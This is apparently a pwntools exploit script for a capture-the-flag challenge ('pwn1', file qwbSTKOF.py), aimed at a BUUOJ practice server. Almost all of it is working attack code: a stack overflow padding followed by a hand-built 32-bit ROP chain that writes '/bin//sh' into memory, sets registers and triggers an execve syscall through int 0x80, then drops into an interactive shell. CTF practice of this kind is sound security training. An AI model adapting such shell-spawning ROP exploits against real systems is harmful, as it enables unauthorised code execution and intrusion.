# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import *
from struct import pack
context.log_level = 'debug'
context.update( os = 'linux', arch = 'i386',timeout = 1)
binary = './pwn1'
elf = ELF(binary)
libc = elf.libc
context.binary = binary
DEBUG = 0
if DEBUG:
    p = process(binary)
    #p = process(['qemu-aarch64','-L','',binary])
    #p = process(['qemu-aarch64','-L','',-g,'1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '27340'
    p = remote(host,port)
l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda a          : int( p.recv(len(str(a)))[2:] , 16)
def dbg():
    gdb.attach(p)
    pause()

def cmd(num):
    sla('>',num)

payload = 'a'*0x10c + "aaaa"
payload += pack('<I', 0x0806e9cb) # pop edx ; ret
payload += pack('<I', 0x080d9060) # @ .data
payload += pack('<I', 0x080a8af6) # pop eax ; ret
payload += '/bin'
payload += pack('<I', 0x08056a85) # mov dword ptr [edx], eax ; ret
payload += pack('<I', 0x0806e9cb) # pop edx ; ret
payload += pack('<I', 0x080d9064) # @ .data + 4
payload += pack('<I', 0x080a8af6) # pop eax ; ret
payload += '//sh'
payload += pack('<I', 0x08056a85) # mov dword ptr [edx], eax ; ret
payload += pack('<I', 0x0806e9cb) # pop edx ; ret
payload += pack('<I', 0x080d9068) # @ .data + 8
payload += pack('<I', 0x08056040) # xor eax, eax ; ret
payload += pack('<I', 0x08056a85) # mov dword ptr [edx], eax ; ret
payload += pack('<I', 0x080481c9) # pop ebx ; ret
payload += pack('<I', 0x080d9060) # @ .data
payload += pack('<I', 0x0806e9f2) # pop ecx ; pop ebx ; ret
payload += pack('<I', 0x080d9068) # @ .data + 8
payload += pack('<I', 0x080d9060) # padding without overwrite ebx
payload += pack('<I', 0x0806e9cb) # pop edx ; ret
payload += pack('<I', 0x080d9068) # @ .data + 8
payload += pack('<I', 0x08056040) # xor eax, eax ; ret
payload += pack('<I', 0x0807be5a) # inc eax ; ret
payload += pack('<I', 0x0807be5a) # inc eax ; ret
payload += pack('<I', 0x0807be5a) # inc eax ; ret
payload += pack('<I', 0x0807be5a) # inc eax ; ret
payload += pack('<I', 0x0807be5a) # inc eax ; ret
payload += pack('<I', 0x0807be5a) # inc eax ; ret
payload += pack('<I', 0x0807be5a) # inc eax ; ret
payload += pack('<I', 0x0807be5a) # inc eax ; ret
payload += pack('<I', 0x0807be5a) # inc eax ; ret
payload += pack('<I', 0x0807be5a) # inc eax ; ret
payload += pack('<I', 0x0807be5a) # inc eax ; ret
payload += pack('<I', 0x080495a3) # int 0x80

sla("pwn it?",payload)

p.interactive()

'''
@File    :   qwbSTKOF.py
@Time    :   2021/07/15 12:06:38
@Author  :   Niyah 
'''